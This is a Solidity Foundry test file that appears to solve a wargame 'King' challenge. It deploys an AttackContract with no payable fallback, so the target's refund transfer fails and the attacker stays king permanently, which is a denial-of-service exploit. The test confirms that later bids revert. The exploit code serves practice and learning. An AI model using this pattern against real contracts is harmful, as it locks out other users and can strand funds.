// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/King.sol";

contract CounterTest is Test {
    King public king;
    AttackContract public attackContract;
    address owner = vm.addr(1);

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.startPrank(owner);
        king = new King{value: 1 ether}();
        vm.stopPrank();
        attackContract = new AttackContract();
    }

    /* denial of service hack */

    function test_BreakKingContract() public {
        assertEq(addressToUint256(owner), addressToUint256(king._king()));
        address someRandomUser = vm.addr(123);
        vm.deal(someRandomUser, 2 ether);
        vm.startPrank(someRandomUser);
        attackContract.attack{value: 2 ether}(address(king));
        assertEq(
            addressToUint256(address(attackContract)),
            addressToUint256(king._king())
        );
        vm.stopPrank();
        vm.deal(address(this), 3 ether);
        vm.expectRevert();
        address(king).call{value: 3 ether}("");
        assertEq(
            addressToUint256(address(attackContract)),
            addressToUint256(king._king())
        );
    }

    function addressToUint256(address _adr) internal pure returns (uint256) {
        return uint256(uint160(_adr));
    }
}

/*
There should be no payable fallback function in attack contract
with this tranfer feature of King contract fails and no else can become the king
*/
contract AttackContract {
    function attack(address _kingAddress) public payable {
        _kingAddress.call{value: msg.value}("");
    }
}
